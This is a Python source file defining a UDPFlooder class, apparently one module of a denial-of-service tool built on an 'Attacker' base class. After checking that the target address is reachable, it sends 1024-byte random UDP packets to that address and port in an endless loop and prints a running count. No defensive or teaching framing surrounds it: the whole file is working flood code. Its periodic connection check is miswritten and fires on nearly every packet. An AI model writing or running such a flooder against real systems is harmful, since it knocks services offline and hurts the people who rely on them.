import socket
from os import urandom as randbytes
from .main import Attacker
from .validators import AddressWithPortValidator
from .connection_checkers import UDPChecker
from .utils import Address


class UDPFlooder(Attacker):
    def __init__(self, address):
        self.address = Address(address)
        self._requsets_sent = 0

    def validate(self):
        AddressWithPortValidator(self.address.raw).validate()

    def run(self):
        self.validate()
        self.check_connection()
        self._start_flood()

    def _start_flood(self):
        address = self.address.get_address()
        port = int(self.address.get_port())
        try:
            with self.get_socket() as sockt:
                while True:
                    if self._requsets_sent % 100000:
                        self.check_connection()
                    sockt.sendto(randbytes(1024), (address, port))
                    self._requsets_sent += 1
                    print(f'Sent {self._requsets_sent} requests')
        finally:
            sockt.close()

    def check_connection(self):
        checker = self.get_checker()
        checker.check_connection()

    @staticmethod
    def get_socket():
        return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def get_checker(self):
        return UDPChecker(self.address.get_address(), self.address.get_port())
